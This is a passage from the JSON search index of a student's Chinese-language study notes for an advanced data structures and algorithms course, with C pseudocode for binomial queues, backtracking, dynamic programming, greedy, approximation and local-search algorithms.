H2-&gt;TheTrees[i] = NULL; break;\n        case 5: /* 101 */  \n            Carry = CombineTrees( T1, Carry );\n            H1-&gt;TheTrees[i] = NULL; break;\n        case 6: /* 110 */  Carry = CombineTrees( T2, Carry );\n            H2-&gt;TheTrees[i] = NULL; break;\n        case 7: /* 111 */  H1-&gt;TheTrees[i] = Carry; \n            Carry = CombineTrees( T1, T2 ); \n            H2-&gt;TheTrees[i] = NULL; break;\n        } /* end switch */\n    } /* end for-loop */\n    return H1;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#deletemin","title":"DeleteMin","text":"BinQueue DeleteMin<pre><code>ElementType  DeleteMin( BinQueue H )\n{    BinQueue DeletedQueue; \n    Position DeletedTree, OldRoot;\n    ElementType MinItem = Infinity;  /* the minimum item to be returned */    \n    int i, j, MinTree; /* MinTree is the index of the tree with the minimum item */\n\n    if ( IsEmpty( H ) )  {  PrintErrorMessage();  return \u2013Infinity; }\n\n    for (i= 0;i&lt; MaxTrees; i++) {  /* Step 1: find the minimum item */\n        if( H-&gt;TheTrees[i] &amp;&amp; H-&gt;TheTrees[i]-&gt;Element &lt; MinItem ) { \n        MinItem = H-&gt;TheTrees[i]-&gt;Element;  MinTree = i;    } /* end if */\n    } /* end for-i-loop */\n    DeletedTree = H-&gt;TheTrees[ MinTree ];  \n    H-&gt;TheTrees[ MinTree ] = NULL;   /* Step 2: remove the MinTree from H =&gt; H\u2019 */ \n    OldRoot = DeletedTree;   /* Step 3.1: remove the root */ \n    DeletedTree = DeletedTree-&gt;LeftChild;   free(OldRoot);\n    DeletedQueue = Initialize();   /* Step 3.2: create H\u201d */ \n    DeletedQueue-&gt;CurrentSize = ( 1&lt;&lt;MinTree ) \u2013 1;  /* 2^MinTree \u2013 1 */\n    for ( j = MinTree \u2013 1; j &gt;= 0; j \u2013 \u2013 ) {  \n        DeletedQueue-&gt;TheTrees[j] = DeletedTree;\n        DeletedTree = DeletedTree-&gt;NextSibling;\n        DeletedQueue-&gt;TheTrees[j]-&gt;NextSibling = NULL;\n    } /* end for-j-loop */\n    H-&gt;CurrentSize  \u2013 = DeletedQueue-&gt;CurrentSize + 1;\n    H = Merge( H, DeletedQueue ); /* Step 4: merge H\u2019 and H\u201d */ \n    return MinItem;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#find","title":"Find","text":"<p>The functions\u00a0<code>BinQueue_Find</code>\u00a0and\u00a0<code>Recur_Find</code>\u00a0are to find\u00a0<code>X</code>\u00a0in a binomial queue\u00a0<code>H</code>. Return the node pointer if found, otherwise return NULL.</p> BinQueue Find<pre><code>BinTree BinQueue_Find( BinQueue H, ElementType X )\n{\n    BinTree T, result = NULL;\n    int i, j; \n\n    for( i=0, j=1; j&lt;=H-&gt;CurrentSize; i++, j*=2) {  /* for each tree in H */\n        T= H-&gt;TheTrees[i];\n        if ( X &gt;= T-&gt;Element ){/* if need to search inside this tree */\n            result = Recur_Find(T, X);\n            if ( result != NULL ) return result;\n        } \n    }\n    return result;\n}\n\nBinTree Recur_Find( BinTree T, ElementType X )\n{\n    BinTree result = NULL;\n    if ( X==T-&gt;Element ) return T;\n    if ( T-&gt;LeftChild!=NULL ){\n        result = Recur_Find(T-&gt;LeftChild, X);\n        if ( result!=NULL ) return result;\n    } \n    if ( T-&gt;NextSibling!=NULL )\n        result = Recur_Find(T-&gt;NextSibling, X);\n    return result;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#deleteroot","title":"DeleteRoot","text":"<p>The function <code>DeleteRoot</code> is to delete the root of a subtree with index <code>Ind</code> from a binomial queue <code>H</code>. The rest of the subtree is then stored as a new binomial queue and returned.</p> <p>\u5176\u5b9e\u5c31\u662f\u5c11\u4e86\u627e\u6700\u5c0f\u6839\u7684\u90a3\u4e00\u6b65\u3002</p> BinQueue_DleteRoot<pre><code>BinQueue DeleteRoot( BinQueue H, int Ind )\n{\n    BinTree OldRoot, SubTree;\n    BinQueue NewBinQ;\n    int i;\n\n    OldRoot = H-&gt;TheTrees[Ind];\n    SubTree = OldRoot-&gt;LeftChild;\n    free(OldRoot);\n    NewBinQ = Initialize();\n    NewBinQ-&gt;CurrentSize = ________; // \u7a7a 1 \uff1a\u7b49\u53f7\u540e\u9762\n    for (________) { // \u7a7a 2\uff1a\u5faa\u73af\u903b\u8f91\n        NewBinQ-&gt;TheTrees[i] = SubTree;\n        SubTree = SubTree-&gt;NextSibling;\n        NewBinQ-&gt;TheTrees[i]-&gt;NextSibling = NULL;\n    }\n    return NewBinQ;\n}\n// (1&lt;&lt;Ind) - 1\n// i=Ind-1;i&gt;=0;i--\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#inverted-file-index","title":"Inverted File Index","text":"<p>\u8fd9\u91cc\u6709\u4e24\u79cd\u5206\u5e03\u5f0f\u7684\u7b56\u7565\uff0c\u5176\u4e00\u662f\u6839\u636e\u5355\u8bcd\u7684\u5b57\u5178\u5e8f\u8fdb\u884c\u5206\u5e03\u5f0f (Term-partitioned index)\uff0c\u5176\u4e8c\u662f\u6839\u636e\u6587\u6863\u8fdb\u884c\u5206\u5e03\u5f0f (Term-partitioned index)\u3002</p> <p>\u663e\u7136\u6839\u636e\u5355\u8bcd\u7684\u5185\u5bb9\u8fdb\u884c\u5206\u5e03\u5f0f\uff0c\u80fd\u591f\u63d0\u9ad8\u7d22\u5f15\u6548\u7387\uff0c\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u9700\u8981\u5c06\u6240\u6709\u5f62\u5f0f\u63a5\u8fd1\u7684\u5355\u8bcd\u90fd\u5b58\u50a8\u5728\u4e00\u4e2a\u5730\u65b9\uff0c\u8fd9\u6837\u5c31\u4f1a\u9020\u6210\u5355\u70b9\u6545\u969c\uff0c\u5bb9\u707e\u80fd\u529b\u5f88\u5dee\uff0c\u6240\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u5e76\u4e0d\u662f\u5f88\u597d\u3002</p> <p>\u800c\u7b2c\u4e8c\u79cd\u529e\u6cd5\u5219\u6709\u8f83\u5f3a\u7684\u5bb9\u707e\u6027\u80fd\u3002\u5373\u4f7f\u4e00\u53f0\u673a\u5668\u65e0\u6cd5\u5de5\u4f5c\uff0c\u4e5f\u4e0d\u4f1a\u5267\u70c8\u5f71\u54cd\u5230\u6574\u4e2a\u7cfb\u7edf\u7684\u5de5\u4f5c\u3002</p> <p>\u8bc4\u4f30\u6807\u51c6</p> <p> \\(\\begin{aligned}&amp;1.Precision\\text{(\u51c6\u786e\u7387)}:\\quad P=R_R/(R_R+I_R)\\\\&amp;\\text{\u51c6\u786e\u7387\u8868\u793a\u5728\u641c\u7d22\u5230\u7684\u4fe1\u606f\u4e2d,\u76f8\u5173\u7684(\u7528\u6237\u60f3\u8981\u7684)\u4fe1\u606f\u7684\u5360\u6bd4\u3002}\\\\&amp;2.Recall\\text{(\u53ec\u56de\u7387)}:R=R_R/(R_R+R_N)\\\\&amp;\\text{\u53ec\u56de\u7387\u8868\u793a\u5728\u76f8\u5173\u7684(\u7528\u6237\u60f3\u8981\u7684)\u4fe1\u606f\u4e2d,\u641c\u7d22\u5230\u7684\u5360\u6bd4\u3002}\\end{aligned}\\)</p> <p></p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#backtracing","title":"Backtracing","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#eight-queens","title":"Eight Queens\uff08\u516b\u7687\u540e\u95ee\u9898\uff09","text":"<p>Find a placement of  8 queens on an 8 x 8 chessboard such that no two queens attack. Two queens are said to attack iff they are in the same row, column, diagonal, or antidiagonal of the chessboard.</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#the-turnpike-reconstruction-problem","title":"The Turnpike Reconstruction Problem\uff08\u6536\u8d39\u516c\u8def\u91cd\u5efa\u95ee\u9898\uff09","text":"<p>Given N points on the x-axis with coordinates \\(x1 &lt;  x2 &lt; \u2026&lt; x_N\\) .  Assume that x1 = 0.  There are \\(N(N\u20131)/2\\) distances between every pair of points, reconstruct a point set from the distances.</p> Reconstruction<pre><code>bool Reconstruct ( DistType X[], DistSet D, int N, int left, int right ){ /* X[1]...X[left-1] and X[right+1]...X[N] are solved */\n    bool Found = false;\n    if (Is_Empty(D))\n        return true; /* solved */\n    D_max = Find_Max(D);\n    /* option 1\uff1aX[right] = D_max */\n    /* check if |D_max-X[i]| \\in D is true for all X[i]\u2019s that have been solved */\n    OK = Check(D_max,N, left, right ); /* pruning */\n    if (OK) { /* add X[right] and update D */\n        X[right] = D_max;\n        for ( i=1; i&lt;left; i++ )  Delete(|X[right]-X[i]|, D);\n        for ( i=right+1; i&lt;=N; i++ )  Delete( |X[right]-X[i]|, D);\n        Found = Reconstruct (X, D, N, left, right-1);\n        if (!Found) { /* if does not work, undo */\n            for ( i=1; i&lt;left; i++ )  Insert( |X[right]-X[i]|, D);\n            for ( i=right+1; i&lt;=N; i++ )  Insert( |X[right]-X[i]|, D);\n        }\n    }\n    /* finish checking option 1 */\nif (!Found) { /* if option 1 does not work */\n        /* option 2: X[left] = X[N]-D_max */\n        OK = Check( X[N]-D_max, N, left, right );\n        if ( OK ) {\n            X[left] = X[N] \u2013 D_max;\n            for ( i=1; i&lt;left; i++ )  Delete( |X[left]-X[i]|, D);\n            for ( i=right+1; i&lt;=N; i++ )  Delete( |X[left]-X[i]|, D);\n            Found = Reconstruct (X, D, N, left+1, right );\n            if (!Found) {\n                for ( i=1; i&lt;left; i++ ) Insert( |X[left]-X[i]|, D);\n                for ( i=right+1; i&lt;=N; i++ ) Insert( |X[left]-X[i]|, D);\n            }\n        }\n        /* finish checking option 2 */\n    } /* finish checking all the options */   \n    return Found;\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u662f PPT \u4e0a\u7684\u4f2a\u4ee3\u7801\uff0c\u611f\u89c9\u6bd4\u8f83\u4e11\u964b\uff1b\u4e0b\u9762\u662f Chap 6 | \u201cBacktracking\u201d \u4e2d\u63d0\u5230\u7684\u4f2a\u4ee3\u7801\uff0c\u5728\u5199\u7f16\u7a0b\u9898\u65f6\u66f4\u4e3a\u5e38\u89c1\u3002</p> BackTracing<pre><code>void BackTracing(\u53c2\u6570) {\n    if (\u7ec8\u6b62\u6761\u4ef6) {\n        \u5b58\u653e\u7ed3\u679c;\n        return;\n    }\n    for (\u9009\u62e9\uff1a\u672c\u5c42\u96c6\u5408\u4e2d\u5143\u7d20\uff08\u6811\u4e2d\u8282\u70b9\u5b69\u5b50\u7684\u6570\u91cf\u5c31\u662f\u96c6\u5408\u7684\u5927\u5c0f\uff09) {\n        \u5904\u7406\u8282\u70b9;\n        BackTracking(\u4e0b\u4e00\u4e2a\u53c2\u6570); \n        \u64a4\u9500\u5904\u7406;\n        BackTracking(\u4e0b\u4e00\u4e2a\u53c2\u6570); \n    }\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#template","title":"Template","text":"Backtracing<pre><code>bool Backtracking (int i){\n    Found = false;\n    if (i &gt; N)\n        return true; /* solved with (x1, \u2026, xN) */\n    for ( each xi \\in Si ) { \n        /* check if satisfies the restriction R */\n        OK = Check((x1, ... , xi) , R ); /* pruning */\n        if (OK) {\n            Count xi in;\n            Found = Backtracking( i+1 );\n            if ( !Found )\n                Undo(i); /* recover to (x1, \u2026, xi-1) */\n        }\n        if (Found) break; \n    }\n    return Found;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#tic-tac-toe","title":"Tic-tac-toe\uff08\u4e95\u5b57\u68cb\uff09","text":"<p>\u89c4\u5219\u6211\u5c31\u4e0d\u4ecb\u7ecd\u4e86\uff0c\u771f\u4e0d\u4f1a\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u641c\u7d22\u4e86\u3002</p> <p>\u5728\u6b64\u5904\uff0c\u6211\u4eec\uff08\u7ad9\u5728 Computer \u7684\u89d2\u5ea6\u4e0a\uff09\u4f7f\u7528 Minimax Strategy\uff1b\u5373\u662f\u8bf4\uff0cComputer \u4e0e Human \u5728\u8fdb\u884c\u4e00\u573a\u96f6\u548c\u535a\u5f08\uff1b\u5bf9\u4e8e\u67d0\u4e00\u51b3\u5b9a\u535a\u5f08\u7ed3\u679c\u7684\u5c5e\u6027\uff0c\u4e00\u65b9\u5c3d\u91cf\u4f7f\u5176\u6700\u5c0f\uff0c\u53e6\u4e00\u65b9\u5c3d\u91cf\u4f7f\u5176\u6700\u5927\u3002</p> <p>\u4f8b\u5982\uff0c\u5728\u4e0b\u9762\u7684\u56fe\u7247\u4e2d\uff0c\u53d6\u8fd9\u4e2a\u201c\u5c5e\u6027\u201d\u4e3a f(P) \uff0c\u5176\u4e0e Computer \u83b7\u80dc\u7684\u6982\u7387\u6210\u6b63\u76f8\u5173\uff0c\u6545 \"The human is trying to minimize the value of the position P, while the computer is trying to maximize it.\"</p> <p></p> <p>Tip</p> <p>W \u662f P \u72b6\u6001\u4e0b\uff0c\u80fd\u591f\u83b7\u80dc\u7684\u6446\u76d8\u65b9\u5f0f\u3002\u5bf9\u4e8e\u68cb\u5b50\u8f83\u5c11\u65f6\uff0c\u53ef\u4ee5\u4ece\u53cd\u9762\u51fa\u53d1\u3002\u56e0\u4e3a\u4e95\u5b57\u68cb\u7684\u83b7\u80dc\u6446\u76d8\u65b9\u5f0f\u53ea\u6709 8 \u79cd\uff08\u4ece\u56fa\u5b9a\u89c6\u89d2\u770b\uff09\u3002</p> <p>\u5728\u4e0a\u56fe\u4e2d\uff0c\u7ea2\u5706\u5360\u636e\u4e86\u4e24\u79cd\uff0c\u6545\u84dd\u8272\u65b9\u8fd8\u6709 8-2=6 \u79cd\u65b9\u5f0f\u83b7\u80dc\uff1b\u84dd\u53c9\u5360\u636e\u4e86 4 \u79cd\uff0c\u7ea2\u8272\u65b9\u8fd8\u6709 8-4=4 \u79cd\u65b9\u5f0f\u83b7\u80dc\u3002</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#-pruning-","title":"\u03b1-\u03b2 pruning\uff08\u03b1-\u03b2\u526a\u679d\uff09","text":"<p>\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u5b9e\u65bd \u03b1-\u03b2 pruning \u540e\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u80fd\u591f\u7531 O(n) \u964d\u81f3 O(sqrt(n))</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#divide-conqueer","title":"Divide &amp; Conqueer","text":"<p>Master Theorems</p> <p>\u5f62\u5f0f\u4e00\uff1a</p> \\[ \\begin{aligned}&amp;\\text{\u5bf9\u4e8e\u5f62\u5982 }T(N)=aT(N/b)+f(N)\\text{ \u7684\u9012\u63a8\u5f0f}:\\\\&amp;1.\\text{ \u82e5 }f(N)=O(N^{(\\log_ba)-\\varepsilon}),\\text{ for }\\varepsilon&gt;0,\\text{ \u90a3\u4e48 }T(N)=\\Theta(N^{\\log_ba});\\\\&amp;2.\\text{ \u82e5 }f(N)=\\Theta(N^{\\log_ba}),\\text{ \u90a3\u4e48 }T(N)=\\Theta(N^{\\log_ba}\\log N);\\\\&amp;3.\\text{ \u82e5 }f(N)=\\Omega(N^{(\\log_ba)+\\varepsilon}),\\text{ for }\\varepsilon&gt;0\\text{ \u4e14 }af(\\frac Nb)&lt;cf(N),\\\\&amp;\\text{ for }c&lt;1\\text{ and }\\forall N&gt; N_0,\\text{ \u90a3\u4e48 }T(N)=\\Theta(f(N));\\end{aligned} \\] <p>\u5f62\u5f0f\u4e8c\uff1a</p> \\[ \\begin{aligned}&amp;\\text{\u5bf9\u4e8e\u5f62\u5982 }T(N)=aT(\\frac Nb)+f(N)\\text{ \u7684\u9012\u63a8\u5f0f}:\\\\&amp; 1.\\text{ \u82e5 }af(\\frac Nb)=k f(N)\\text{ for fixed }k&lt;1\\text{,\u90a3\u4e48 }T(N)=\\Theta(f(N));\\\\&amp; 2.\\text{ \u82e5 }af(\\frac Nb)=Kf(N)\\text{ for fixed K}&gt;1\\text{,\u90a3\u4e48 }T(N)=\\Theta(N^{\\log_ba})\\\\&amp; 3.\\text{ \u82e5 }af(\\frac Nb)=f(N),\\text{ \u90a3\u4e48 }T(N)=\\Theta(f(N)\\log_bN);\\end{aligned} \\] <p>\u4e2a\u4eba\u6bd4\u8f83\u559c\u6b22\u5f62\u5f0f\u4e8c\uff0c\u56e0\u4e3a\u5f88\u597d\u5730\u8868\u8fbe\u4e86\u201c\u4e3b\u201d\u5b9a\u7406\u7684\u610f\u601d\uff1a\u53d6  </p> \\[k = \\lim_{ N \\to \\infty } \\frac{af\\left( \\frac{N}{b} \\right)}{f(N)}\\] <p>k \u4e0e 1 \u7684\u5173\u7cfb\u8868\u793a\u4e86 \\(af\\left( \\frac{N}{b} \\right) \u4e0e f(N)\\) \u4e4b\u95f4\u7684\u76f8\u5bf9\u5173\u7cfb\uff0c\u8868\u660e\u4e86\u8c01\u662f\u201c\u4e3b\u201d\u5bfc\uff0c\u800c\u4e14\u597d\u8bb0\u3002</p> <p>\u5f62\u5f0f\u4e09\uff1a</p> <p>\\(\\begin{gathered}T(N)=a\\:T(N/b)+\\Theta(N^k\\log^pN),\\mathrm{where~}a\\geq1,b&gt;1,\\mathrm{~and~}p\\geq0\\mathrm{~is}\\\\T(N)=\\begin{cases}O(N^{\\log_ba})&amp;\\mathrm{if~}a&gt;b^k\\\\O(N^k\\log^{p+1}N)&amp;\\mathrm{if~}a=b^k\\\\O(N^k\\log^pN)&amp;\\mathrm{if~}a&lt;b^k\\end{cases}\\end{gathered}\\)</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#closet-points-problem","title":"Closet Points Problem","text":"pseudo code<pre><code>/* points are all in the strip */\n/* and sorted by y coordinates */\nfor (i= 0;i&lt; NumPointsInStrip; i++ )\n    for ( j =i+ 1; j &lt; NumPointsInStrip; j++ ) \n        if ( Dist_y( Pi , Pj ) &gt; \u03b4 )\n            break;\n        else  if ( Dist( Pi , Pj ) &lt; \u03b4 )\n            \u03b4 = Dist( Pi , Pj );\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#greedy-algorithm","title":"Greedy Algorithm","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#activity-selection-problem","title":"Activity Selection Problem","text":"<p>Given a set of activities\u00a0S=a1\u200b,a2\u200b,...,an\u200b\u00a0that wish to use a resource (e.g. a classroom). Each\u00a0ai\u200b\u00a0takes place during a time interval\u00a0[si\u200b,fi\u200b).</p> <p>Activities\u00a0ai\u200b\u00a0and\u00a0aj\u200b\u00a0are compatible if\u00a0si\u200b\u2265fj\u200b\u00a0or\u00a0sj\u200b\u2265fi\u200b\u00a0(i.e. their time intervals do\u00a0not overlap).</p> <p>Goal:\u00a0Select a maximum-size subset of mutually compatible activities.</p> <ul> <li>Assume\u00a0f1\u200b\u2265f2\u200b\u2265...\u2265fn\u200b.</li> </ul> <p>\u8fd9\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u4e00\u7ef4\u5e73\u94fa\u95ee\u9898\uff0c\u4f7f\u7528\u8d2a\u5a6a\u7b97\u6cd5\u7684\u8bdd\uff0c\u4ece\u524d\u5411\u540e\uff0c\u6bcf\u6b21\u9009\u53d6\u4e0d\u51b2\u7a81\u7684\u6d3b\u52a8\u4e2d\uff0c\u6700\u65e9\u7ed3\u675f\u7684\u90a3\u4e2a\u6d3b\u52a8\u5373\u53ef\u3002</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#huffmans-algorithm","title":"Huffman's Algorithm","text":"<p>\u4e0b\u9762\u7684\u4f2a\u4ee3\u7801\u6765\u81ea PPT \uff0c\u770b\u4e0d\u61c2\u5728\u5e72\u4ec0\u4e48\uff1bhaffman's code \u672c\u8eab\u5f88\u597d\u7406\u89e3\uff1a\u6309\u7167\u51fa\u73b0\u9891\u7387\u6392\u5e8f\uff0c\u6bcf\u6b21\u9009\u62e9\u6700\u4f4e\u9891\u7387\u7684\u4e24\u4e2a\u4f5c\u4e3a\u4e8c\u53c9\u6811\u7684\u4e24\u4e2a\u8282\u70b9\u5e76\u5408\u51fa\u5176\u7236\u8282\u70b9\uff1b\u4f9d\u6b21\u7c7b\u63a8\u76f4\u5230\u6784\u5efa\u4e00\u9897\u5b8c\u6574\u7684\u4e8c\u53c9\u6811\uff0c\u6240\u6709\u8bcd\u90fd</p> Huffman<pre><code>void Huffman ( PriorityQueue heap[],  int  C ){\n    consider the C characters as C single node binary trees,\n    and initialize them into a min heap;\n    for (i= 1;i&lt; C; i++ ) { \n       create a new node;\n       /* be greedy here */\n       delete root from min heap and attach it to left_child of node;\n       delete root from min heap and attach it to right_child of node;\n       weight of node = sum of weights of its children;\n       /* weight of a tree = sum of the frequencies of its leaves */\n       insert node into min heap;\n   }\n} // T=O(C logC)\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#dynamic-programming","title":"Dynamic Programming","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#fibonacci","title":"Fibonacci","text":"Fib<pre><code>int  Fib( int N ) \n{ \n    if ( N &lt;= 1 ) \n        return  1; \n    else \n        return  Fib( N - 1 ) + Fib( N - 2 ); \n}\n\nint  Fibonacci ( int N ) \n{   int  i, Last, NextToLast, Answer; \n    if ( N &lt;= 1 )  return  1; \n    Last = NextToLast = 1;    /* F(0) = F(1) = 1 */\n    for (i= 2;i&lt;= N; i++ ) { \n        Answer = Last + NextToLast;   /* F(i) = F(i-1) + F(i-2) */\n        NextToLast = Last; Last = Answer;  /* update F(i-1) and F(i-2) */\n    }\n    return  Answer; \n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#ordering-matrix-multiplications","title":"Ordering Matrix Multiplications","text":"OptMatrix<pre><code>/* r contains number of columns for each of the N matrices */ \n/* r[0] is the number of rows in matrix 1 */ \n/* Minimum number of multiplications is left in M[ 1 ][ N ] */ \nvoid OptMatrix( const long r[ ], int N, TwoDimArray M ) \n{   int  i, j, k, L; \n    long ThisM; \n    for(i= 1;i&lt;= N; i++ )   M[i][i] = 0; \n    for( k = 1; k &lt; N; k++ ) /* k = j -i*/ \n        for(i= 1;i&lt;= N - k; i++ ) { /* For each position */ \n            j =i+k; M[i][j] = Infinity; \n            for (L = i; L &lt; j; L++ ) { \n                ThisM = M[i][L] + M[L+1][j] + r[i-1] * r[L] * r[j]; \n                if (ThisM &lt; M[i][j])  /* Update min */ \n                M[i][j] = ThisM; \n            }  /* end for-L */\n        }  /* end for-Left */\n}\n</code></pre> <p>\\(T(N) = O(N^3)\\)</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#optimal-binary-search-tree","title":"Optimal Binary Search Tree","text":"<p>Given  N  words  w1 &lt; w2 &lt; \u2026\u2026 &lt; wN, and the probability of searching for each  wi  is  pi .  Arrange these words in a binary search tree in a way that minimize the expected total access time. \\(T(N)=\\sum_{i=1}^Np_i\\cdot(1+d_i)\\)</p> <p>\u5982\u679c\u6211\u4eec\u8bb0\uff1a</p> \\[ \\begin{aligned}&amp;T_{ij}::=\\text{OBST for }w_i,......,w_j\\text{ ( i&lt;j )}\\\\&amp;c_{ij}::=\\text{cost of }T_{ij}\\text{ ( }c_{ii}=0\\text{ )}\\\\&amp;r_{ij}::=\\text{root of }T_{ij}\\\\&amp;w_{ij}::=\\text{weight of }T_{ij}=\\sum_{k=i}^jp_k(w_{ii}=p_i)\\end{aligned} \\] <p></p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#all-pairs-shortest-path","title":"All-Pairs Shortest Path","text":"<p>Floyd-Warshall \u7b97\u6cd5</p> <p></p> AllPairs<pre><code>/* A[ ] contains the adjacency matrix with A[i][i] = 0 */ \n/* D[ ] contains the values of the shortest path */ \n/* N is the number of vertices */ \n/* A negative cycle exists iff D[i][i] &lt; 0 */ \nvoid AllPairs( TwoDimArray A, TwoDimArray D, int N ) \n{   int  i, j, k; \n    for (i= 0;i&lt; N; i++ )  /* Initialize D */ \n         for( j = 0; j &lt; N; j++ )\n     D[i][j] = A[i][j]; \n    for( k = 0; k &lt; N; k++ )  /* add one vertex k into the path */\n         for(i= 0;i&lt; N; i++ ) \n     for( j = 0; j &lt; N; j++ ) \n        if( D[i][k] + D[k][j] &lt; D[i][j] ) \n        /* Update shortest path */ \n         D[i][j] = D[i][k] + D[k][j]; \n}\n</code></pre> <p>\\(T(N)=O(N^3)\\), faster in a dense graph.</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#decode","title":"Decode","text":"<p>\u5efa\u8bae\u770b\u6e05\u9898\u76ee\uff0c\u4e0d\u7136\u5c31\u50cf\u67d0\u4f4d\u540c\u5b66\u4e00\u6837\u586b\u53cd\u4e86\u2026\u2026\uff0c\u4e0b\u56fe\u4e2d\u662f\u6b63\u786e\u586b\u7a7a\u3002</p> <p></p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#np-completeness","title":"NP-Completeness","text":"<p>wikipedia</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#halting-problem","title":"halting problem","text":"<pre><code>Loop( P ) {  \n/* 1 */ if ( P(P) loops )   print (YES);\n/* 2 */ else infinite_loop();\n}\n\nLoop(Loop); // contradiction\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#np-complete","title":"NP complete","text":"<p>isshikih \u7684\u7b14\u8bb0</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#reduce","title":"\u89c4\u7ea6 (Reduce)","text":"<p>\u7b26_\u53f7 \\(A \\leq_p B\\) \u7684\u542b\u4e49\u662f A no harder than B\uff0cA \u53ef\u4ee5\u88ab\u89c4\u7ea6\u4e3a B \u3002</p> <p>\u56fe\u7247\u6765\u81ea\u67d0\u624b\u5199\u7b14\u8bb0\uff0c\u6765\u6e90\u4e0d\u8be6\uff0c\u5982\u6709\u4e0d\u5f53\u8bf7\u7559\u8a00\u6216\u8005\u8054\u7cfb\u6211\u3002</p> <p>A language L1 is polynomial-time reducible to a language L2 ( L1 \u2264P L2 ) if there exists a polynomial-time computable function  f : {0, 1} \u2192 {0,1} such that for all \\(x \\{0, 1\\}*,  x \\in L1  \\iff  f (x) \\in L2\\).</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#cp-2-vcp","title":"CP 2 VCP","text":"<p>proof: G has a clique of size K iff \\(\\overline{G}\\) has a vertex cover of size |V| - K. </p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#approximate","title":"Approximate","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#approximate-bin-packing","title":"Approximate Bin Packing","text":"<p>Given N items of sizes  S1 , S2 , \u2026, SN , such that \\(0 &lt; S_{i} \\leq1\\) for all \\(1 \\leq i \\leq N\\) .  Pack these items in the fewest number of bins, each of which has unit capacity.</p> <ul> <li>NextFit<ul> <li>\\(\\leq 2M-1\\)</li> </ul> </li> <li>FirstFit<ul> <li>\\(\\leq 1.7M\\)</li> </ul> </li> <li>BestFit<ul> <li>\\(\\leq 1.7 M\\)</li> </ul> </li> <li>First Fit Decreasing(offline)<ul> <li>\\(\\leq \\frac{11M + 6}{9}\\)</li> </ul> </li> </ul> Fit<pre><code>void FirstFit ( )\n{   while ( read item ) {\n        scan for the first bin that is large enough for item;\n        if ( found )\n    place item in that bin;\n        else\n    create a new bin for item;\n    } /* end-while */\n}\n\nvoid FirstFit ( )\n{   while ( read item ) {\n        scan for the first bin that is large enough for item;\n        if ( found )\n    place item in that bin;\n        else\n    create a new bin for item;\n    } /* end-while */\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#the-knapsack-problem","title":"The Knapsack Problem","text":"<ul> <li>fractional version<ul> <li>greedy with maximum profit density pi / wi </li> </ul> </li> <li>0-1 version<ul> <li>\\(p_{max}\\) \u8868\u793a\u4ef7\u503c\u6700\u9ad8\u7684\u7269\u54c1 </li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/other/ADS_PPT/#the-k-center-problem","title":"The K-center Problem","text":"greedy - 2r<pre><code>Centers  Greedy-2r ( Sites S[ ], int n, int K, double r )\n{   Sites  S\u2019[ ] = S[ ]; /* S\u2019 is the set of the remaining sites */\n    Centers  C[ ] = empty;\n    while ( S\u2019[ ] != empty ) {\n        Select any s from S\u2019 and add it to C;\n        Delete all s\u2019 from S\u2019 that are at dist(s\u2019, s) \uf0a3 2r;\n    } /* end-while */\n    if ( |C| \uf0a3 K ) return C;\n    else ERROR(No set of K centers with covering radius at most r);\n}\n</code></pre> smarter solution<pre><code>Centers  Greedy-Kcenter ( Sites S[ ], int n, int K )\n{   Centers  C[ ] = \uf0c6;\n    Select any s from S and add it to C;\n    while ( |C| &lt; K ) {\n        Select s from S with maximum dist(s, C);\n        Add s it to C;\n    } /* end-while */\n    return C;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#local-search","title":"Local search","text":"<pre><code>SolutionType Gradient_descent()\n{   Start from a feasible solution S \\in FS ;\n    MinCost = cost(S);\n    while (1) {\n        S\u2019 = Search( N(S) ); /* find the best S\u2019 in N(S) */\n        CurrentCost = cost(S\u2019);\n        if ( CurrentCost &lt; MinCost ) {\n            MinCost = CurrentCost;    S = S\u2019;\n        }\n        else  break;\n    }\n    return S;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#the-vertex-cover-problem","title":"The Vertex Cover Problem","text":"metropolis<pre><code>SolutionType Metropolis() {   // Simulated Annealing\n    Define constants k and T;\n    Start from a feasible solution S \\in FS ;\n    MinCost = cost(S);\n    while (1) {\n        S\u2019 = Randomly chosen from N(S); \n        CurrentCost = cost(S\u2019);\n        if ( CurrentCost &lt; MinCost ) {\n            MinCost = CurrentCost;    S = S\u2019;\n        }\n        else {\n            With a probability e^{-\\Delta cost / 